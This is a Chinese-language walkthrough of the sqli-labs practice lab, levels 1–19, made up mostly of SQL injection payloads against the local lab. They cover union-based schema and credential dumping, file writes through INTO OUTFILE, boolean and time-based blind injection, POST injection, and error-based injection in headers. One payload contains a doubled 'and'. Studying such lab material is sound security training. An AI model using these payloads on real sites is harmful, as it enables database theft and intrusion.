# sqli-labs

-    ##  less 1

     -  判断是否可以注入
     -  判断列数  
        - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=1'order by 4 -- a`
        - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=1'order by 3 -- a`
        - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1'union select 1,2,3 -- +`
     - 爆库
       - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- +`
     - 爆库下的表  
       -  `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security' -- +`
     - 表下的列
        - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,GROUP_CONCAT(column_name),3 from information_schema.columns where table_name='users' -- a`
     - result
       - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,GROUP_CONCAT(username),GROUP_CONCAT(password) from users -- a`
-    ##  less 2
     - 与less1相同，只需要去掉      <b> '</b>       即可
-    ##  less 3
     - ` $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`
     - 需要闭合 &emsp;<b>')</b>

-    ##  less 4
     -  对于字段是int类型的，如果你传入字符串（无论是在select, insert 还是 update)，他会尝试转为数字的
     -   `$id = '"' . $id . '"';`
     -   `$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";`
     -  如此闭合   
		`http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-4/?id=1") order by 3  -- a`

-   ##   less 5,6 
    - 均为盲注内容
    - <a href="盲注.md">盲注</a>
-   ##   less 7
    - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-7/?id=1'))  union select 1,2,3 into outfile "F:\\wampserver\\wamp64\\tmp\\file\\uuu3.txt" -- a`

-   ##   less 8
    - 延迟注入
    - `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-8/?id=1' and 1=(if(SUBSTRING((select DATABASE()),1,1)='s',1,0))-- a`
-   ##   less 9
    -   无论输入对错 都返回 you are in
    -   基于时间盲注
    -   `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-9/?id=1' and  if((select database())='securitys',sleep(5),1)  -- a`

-   ##   less 10
    -   同 less9
    -   `http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-10/?id=1" and if((select database())='security',sleep(5),1) -- a`
-   ##   less 11
    -   post注入
    -   提交 `1admin'union select 1,database()#`
-   ##   less 12
    -   `1admin")union select 1,database()#`
-   ##   less 13
    -   `1admin')or left(database(),1)='s' -- a`
-   ##   less 14
    -   `1admin" or left(database(),1)='s' -- a`
-   ##   less 15
    -   `adm1in1'or 1=(If(substr(database(),1,1)='s',1,2))#`
-   ##   less 16
    -   `adm1in1") or 1=(If(substr(database(),1,1)='s',1,2))#`
-   ##   less 17
    -  ` admin`
    -   `123' and and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`
-   ##   less 18
    -   `admin`
    -   `admin`
    -   user-agent:` 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1`
-   ##   less 19
    -   `admin`
    -   `123`
    -   `Referer: 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1`